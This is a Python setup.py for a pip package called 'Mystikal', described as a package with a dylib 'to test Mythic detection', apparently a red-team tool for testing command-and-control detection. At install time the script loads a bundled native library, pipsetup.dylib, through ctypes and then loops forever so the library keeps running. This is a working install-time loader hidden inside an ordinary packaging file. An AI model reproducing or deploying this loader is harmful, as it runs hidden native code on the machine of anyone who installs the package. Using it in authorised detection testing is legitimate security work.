from setuptools import setup, find_packages
import os
import sys
import time
import ctypes
from ctypes import *

libc = "/usr/lib/libSystem.B.dylib"
lib = ctypes.CDLL(libc)
pwd = os.path.dirname(os.path.realpath(__file__))
load = pwd + "/pipsetup.dylib"
handle = ctypes.CDLL(load)
while True:
   time.sleep(1)

setup(
    name = 'Mystikal',
    packages = find_packages(),
    version = '1.0',
    description = 'Python PIP package w/ Dylib to test Mythic detection',
    author = '',
    author_email = '',
    url = 'https://github.com/D00MFist/Mystikal',
    download_url = 'https://github.com/D00MFist/Mystikal',
    keywords = [''],
    classifiers = [],
)
